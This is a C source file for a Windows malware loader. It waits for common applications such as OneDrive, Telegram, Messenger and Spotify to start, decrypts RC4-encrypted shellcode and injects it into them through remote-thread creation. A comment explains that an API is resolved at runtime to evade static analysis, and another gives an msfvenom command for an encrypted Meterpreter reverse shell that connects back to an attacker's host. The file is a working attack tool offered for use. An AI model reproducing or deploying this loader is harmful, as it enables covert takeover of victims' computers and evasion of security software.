// Coded by s1ege, greetz to all #GSH members.
#include <windows.h>
#include <stdbool.h>
#include <tlhelp32.h>
#include "rc4.h"

// "targets" array length macro.
#define MAX_TARGETS 4
#define RC4KEY "<enter rc4 key here>"

const LPCSTR targets[] = {
                        "OneDrive.exe",
                        "Telegram.exe",
                        "Messenger.exe",
                        "Spotify.exe"
                        };

// Process map structure.
typedef struct {
    // Each pid will be stored at the index of corresponding process name index in "targets" array.
    DWORD pids[MAX_TARGETS];
    // Array of DWORDs to track targeted pids to prevent repetitive process injection.
    DWORD *targeted;
    size_t targeted_size;
} pMap;

typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(
                        HANDLE ProcessHandle,
                        PVOID BaseAddress,
                        PVOID Buffer,
                        ULONG NumberOfBytesToWrite,
                        PULONG NumberOfBytesWritten
                        );

// Dynamically add pids to "targeted" array.
void add_pid(pMap *a, DWORD pid) {
    if (a->targeted_size) {
        a->targeted = realloc(a->targeted, a->targeted_size+1 * sizeof(DWORD));
    } 
    else {
        a->targeted = malloc(sizeof(DWORD));
    }
    a->targeted[a->targeted_size++] = pid;
}

// Check whether pid evaluates to true or if pid has already been added to "targeted" array.
bool check_pid(pMap *a, DWORD pid) {
    if (pid) {
        for (size_t i=0; i<a->targeted_size; i++) {
            if (a->targeted[i] == pid)
                return false;
        }
        return true;
    }
    return false;
}

// Filter the target processes' corresponding pid.
DWORD filter_pid(LPCSTR pname) {
    PROCESSENTRY32 pt;
    HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pt.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hsnap, &pt)) {
        do {
            if (!lstrcmpi(pt.szExeFile, pname)) {
                CloseHandle(hsnap);
                return pt.th32ProcessID;
            }
        } while (Process32Next(hsnap, &pt));
    }
    CloseHandle(hsnap);
    return 0;
}

DWORD WINAPI scan_pids(LPVOID *lpParameter) {
    pMap *a = (pMap*)lpParameter;
    while (true) {
        for (size_t i=0; i<MAX_TARGETS; i++) {
            DWORD pid = filter_pid(targets[i]);
            if (check_pid(a, pid)) {
                a->pids[i] = pid;
            }
            else {
                // Sleep to limit CPU usage.
                Sleep(15);
            }
        }
    }
    return 0;
}

DWORD WINAPI free_pids(LPVOID *lpParameter) {
    pMap *a = (pMap*)lpParameter;
    while (true) {
        Sleep(900 * 1000);
        if (a->targeted_size) {
            free(a->targeted);
            a->targeted_size = 0;
        }
    }
    return 0;
}

void inject(unsigned char shellcode[], int PAYLOADSIZE, DWORD pid) {
    // Dynamically load NtWriteVirtualMemory API from ntdll.dll (to evade static analysis).
    _NtWriteVirtualMemory NtWriteVirtualMemory =
        (_NtWriteVirtualMemory)GetProcAddress(
	    				GetModuleHandleA("ntdll.dll"),
					"NtWriteVirtualMemory");

    // Allocate memory for sc buffer.
    int scsize = sizeof(int) * PAYLOADSIZE;
    LPVOID sc = VirtualAlloc(NULL, scsize, MEM_COMMIT, 0x04);

    // Decrypt shellcode and store in sc buffer.
    memset(sc, '\0', scsize);
    RC4(RC4KEY, (char*)shellcode, (unsigned char*)sc, PAYLOADSIZE);

    // inject shellcode into process memory space.
    HANDLE processHandle = OpenProcess(
				    PROCESS_ALL_ACCESS,
				    FALSE,
				    pid
				    );
    PVOID remote_buf = VirtualAllocEx(
				processHandle,
				NULL,
				sizeof(sc),
				(MEM_RESERVE | MEM_COMMIT),
				PAGE_EXECUTE_READWRITE
				);
    NtWriteVirtualMemory(
		processHandle,
		remote_buf,
		(unsigned char*)sc,
		scsize, 
		0
		);
    HANDLE remoteThread = CreateRemoteThread(
				    processHandle,
				    NULL,
				    0,
				    (LPTHREAD_START_ROUTINE)remote_buf,
				    NULL,
				    0,
				    NULL
				    );
    CloseHandle(processHandle);
}

int main() {
    // msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=<host> LPORT=<port> RC4PASSWORD=<network_level_rc4_key> --encrypt rc4 --encrypt-key <binary_level_rc4_key>
    unsigned char shellcode[] = 
    < enter shellcode here >
    
    // Instantiate a instance of pMap structure to track pids and targeted pids with all member values set to zero.
    pMap a = { {0}, {0}, 0 };

    // Thread to Scan for pids.
    CreateThread(0, 0, scan_pids, &a, 0, 0);
    // Thread to free "targeted" array to limit memory usage.
    CreateThread(0, 0, free_pids, &a, 0, 0);

    while (true) {
        for (size_t i=0; i<MAX_TARGETS; i++) {
            if (check_pid(&a, a.pids[i])) {
                inject(shellcode, sizeof(shellcode), a.pids[i]);
                add_pid(&a, a.pids[i]);
            }
            else {
            // Sleep for 1 second to limit cpu usage.
            Sleep(1000);
            }
        }
    }
    return 0;
}
